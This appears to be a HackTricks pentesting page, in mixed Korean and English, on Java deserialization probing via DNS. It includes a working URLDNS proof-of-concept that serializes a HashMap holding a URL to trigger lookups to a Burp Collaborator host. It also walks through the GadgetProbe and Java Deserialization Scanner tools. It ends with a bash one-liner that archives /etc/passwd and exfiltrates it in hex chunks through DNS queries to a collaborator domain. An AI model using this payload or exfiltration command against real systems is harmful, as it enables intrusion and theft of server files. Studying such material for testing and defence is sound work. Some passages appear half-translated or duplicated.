# Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## DNS 요청 및 역직렬화

클래스 `java.net.URL`는 `Serializable`을 구현합니다. 이는 이 클래스가 직렬화될 수 있음을 의미합니다.
```java
public final class URL implements java.io.Serializable {
```
이 클래스는 **호기심 많은 동작**을 가지고 있습니다. 문서에서: “**두 호스트는 두 호스트 이름이 동일한 IP 주소로 해석될 수 있는 경우 동등한 것으로 간주됩니다**.”\
그런 다음, URL 객체가 **`equals`** 또는 **`hashCode`**의 **어떤** 함수를 호출할 때마다 **IP 주소**를 얻기 위한 **DNS 요청**이 **전송**됩니다.

**URL** 객체에서 **`hashCode`** 함수를 **호출하는** 것은 상당히 쉽습니다. 이 객체를 **역직렬화**될 `HashMap`에 삽입하기만 하면 됩니다. 이는 **`HashMap`의 `readObject`** 함수의 **끝**에서 이 코드가 실행되기 때문입니다:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
It is **going** the **execute** `putVal` with every value inside the `HashMap`. But, more relevant is the call to `hash` with every value. This is the code of the `hash` function:  
이것은 `HashMap` 내부의 모든 값으로 `putVal`을 **실행**할 **것입니다**. 그러나, 더 관련성이 높은 것은 모든 값으로 `hash`를 호출하는 것입니다. 이것은 `hash` 함수의 코드입니다:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
As you can observe, **when deserializing** a **`HashMap`** the function `hash` is going to **be executed with every object** and **during** the **`hash`** execution **it's going to be executed `.hashCode()` of the object**. Therefore, if you **deserializes** a **`HashMap`** **containing** a **URL** object, the **URL object** will **execute** `.hashCode()`.

이제 `URLObject.hashCode()`의 코드를 살펴보겠습니다:
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
As you can see, when a `URLObject` executes`.hashCode()` it is called `hashCode(this)`. A continuation you can see the code of this function:

당신이 볼 수 있듯이, `URLObject`가 `.hashCode()`를 실행할 때 `hashCode(this)`가 호출됩니다. 계속해서 이 함수의 코드를 볼 수 있습니다:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
You can see that a `getHostAddress` is executed to the domain, **DNS 쿼리를 시작합니다**.

Therefore, this class can be **악용될 수 있습니다** in order to **시작** a **DNS 쿼리** to **증명하기 위해** that **역직렬화** is possible, or even to **정보를 유출할 수 있습니다** (you can append as subdomain the output of a command execution).

### URLDNS payload code example

You can find the [URDNS payload code from ysoserial here](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java). However, just for make it easier to understand how to code it I created my own PoC (based on the one from ysoserial):
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### More information

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* 원래 아이디어에서 commons collections 페이로드는 DNS 쿼리를 수행하도록 변경되었으며, 이는 제안된 방법보다 신뢰성이 떨어졌지만, 이 게시물입니다: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

[**GadgetProbe**](https://github.com/BishopFox/GadgetProbe)를 Burp Suite App Store (Extender)에서 다운로드할 수 있습니다.

**GadgetProbe**는 서버의 Java 클래스에 일부 **Java 클래스가 존재하는지** 확인하여 **취약한지** 알 수 있도록 합니다.

### How does it work

**GadgetProbe**는 이전 섹션의 **DNS 페이로드**를 사용하지만 **DNS 쿼리를 실행하기 전에** **임의의 클래스를 역직렬화하려고 시도**합니다. **임의의 클래스가 존재하면**, **DNS 쿼리**가 **전송**되고 GadgetProbe는 이 클래스가 존재한다고 기록합니다. **DNS** 요청이 **결코 전송되지 않으면**, 이는 **임의의 클래스가 성공적으로 역직렬화되지 않았음을 의미**하므로, 존재하지 않거나 **직렬화할 수 없거나/악용할 수 없습니다**.

GitHub 내에서, [**GadgetProbe에는 테스트할 Java 클래스가 포함된 일부 단어 목록**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)이 있습니다.

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1).gif>)

### More Information

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Java Deserialization Scanner

이 스캐너는 Burp App Store (**Extender**)에서 **다운로드**할 수 있습니다.\
**확장**은 **수동** 및 능동 **기능**을 가지고 있습니다.

### Passive

기본적으로 모든 요청과 응답을 **수동적으로 확인**하여 **Java 직렬화 마법 바이트**를 찾고, 발견된 경우 취약성 경고를 표시합니다:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (765).png>)

### Active

**Manual Testing**

요청을 선택하고 마우스 오른쪽 버튼을 클릭한 후 `Send request to DS - Manual Testing`을 선택할 수 있습니다.\
그런 다음, _Deserialization Scanner Tab_ --> _Manual testing tab_에서 **삽입 지점**을 선택할 수 있습니다. 그리고 **테스트를 시작**합니다 (사용된 인코딩에 따라 적절한 공격을 선택).

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

이것이 "수동 테스트"라고 불리지만, 상당히 **자동화되어** 있습니다. **역직렬화**가 **어떤 ysoserial 페이로드**에 **취약한지** 자동으로 확인하고, 웹 서버에 존재하는 라이브러리를 확인하여 취약한 라이브러리를 강조 표시합니다. **취약한 라이브러리**를 **확인**하기 위해 **Javas Sleeps**, **CPU** 소비를 통한 **sleeps**, 또는 이전에 언급된 **DNS**를 사용할 수 있습니다.

**Exploiting**

취약한 라이브러리를 식별한 후, 요청을 _Exploiting Tab_으로 보낼 수 있습니다.\
이 탭에서 **주입 지점**을 다시 **선택**하고, 페이로드를 생성할 **취약한 라이브러리**와 **명령**을 **작성**해야 합니다. 그런 다음, 적절한 **공격** 버튼을 누릅니다.

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/4.png)

### Java Deserialization DNS Exfil information

페이로드가 다음과 같은 작업을 실행하도록 만드세요:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### More Information

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
